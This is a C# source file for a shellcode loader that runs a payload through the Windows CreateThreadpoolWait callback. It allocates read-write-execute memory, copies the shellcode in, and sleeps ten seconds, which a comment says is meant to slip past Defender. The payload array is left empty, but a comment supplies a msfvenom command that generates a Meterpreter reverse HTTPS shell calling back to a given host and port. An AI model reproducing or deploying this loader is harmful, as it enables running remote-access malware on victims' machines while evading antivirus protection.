using System;
using System.Runtime.InteropServices;
// this program executes our shellcode via a pointer to another function eg. callback there are many more callback apis in msdn.
namespace CallBackTest
{
    [Flags]
    public enum AllocationType
    {
        Commit = 0x00001000,
        Reserve = 0x00002000,
        Decommit = 0x00004000,
        Release = 0x00008000,
        Reset = 0x00080000,
        TopDown = 0x00100000,
        WriteWatch = 0x00200000,
        Physical = 0x00400000,
        LargePages = 0x20000000
    }

    [Flags]
    public enum MemoryProtection
    {
        NoAccess = 0x0001,
        ReadOnly = 0x0002,
        ReadWrite = 0x0004,
        WriteCopy = 0x0008,
        Execute = 0x0010,
        ExecuteRead = 0x0020,
        ExecuteReadWrite = 0x0040,
        ExecuteWriteCopy = 0x0080,
        GuardModifierflag = 0x0100,
        NoCacheModifierflag = 0x0200,
        WriteCombineModifierflag = 0x0400
    }
    class Callback
    {
        //allocates Memory for our shellcode
        [DllImport("kernelbase.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
        //callback api to cast our shellcode via a pointer
        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThreadpoolWait(IntPtr pfnwa, uint pv, uint pcb);
        //Sets the wait object, replacing the previous wait object, if any. A worker thread calls the wait object's callback function after the handle becomes signaled or after the specified timeout expires.
        [DllImport("kernel32.dll")]
        private static extern void SetThreadpoolWait(IntPtr pwa, IntPtr h, IntPtr pftTimeout);
        //Creates or opens a named or unnamed event object.
        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateEventA(IntPtr lpEventAttributes, bool bManualReset, bool bInitialState, bool lpName);
        //Copies the contents of a source memory block to a destination memory block, and supports overlapping source and destination memory blocks.
        [DllImport("ntdll.dll")]
        private static extern bool RtlMoveMemory(IntPtr addr, byte[] pay, uint size);
        //Sets the specified event object to the signaled state.
        [DllImport("kernel32.dll")]
        private static extern bool SetEvent(IntPtr hndle);
        //Waits until the specified object is in the signaled state or the time-out interval elapses.
        [DllImport("kernel32.dll")]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

       
        static void Main(string[] args)

        {
            //our payload. Examle use metasploit x64: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.88.137 LPORT=443 -f csharp -b \x00
            byte[] payload = new byte[] { };

            // Allocate memory
            // Copy shellcode
            //not opsec method because we execute read and write at the same time in the memory
            IntPtr p = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, AllocationType.Commit, MemoryProtection.ExecuteReadWrite);
            IntPtr evt = CreateEventA(IntPtr.Zero, false, true, false);
            //sleep the thread before execution to bypass propably defender
             System.Threading.Thread.Sleep(10000);
            RtlMoveMemory(p, payload, (uint)payload.Length);
             // Execution via Callback CreateThreadPoolWait
            IntPtr result = CreateThreadpoolWait(p, 0, 0);
            SetThreadpoolWait(result, evt, IntPtr.Zero);
            SetEvent(evt);
            WaitForSingleObject(evt, 0);
            //wait until a key is pressed 
             Console.ReadKey();
        }


    }

}
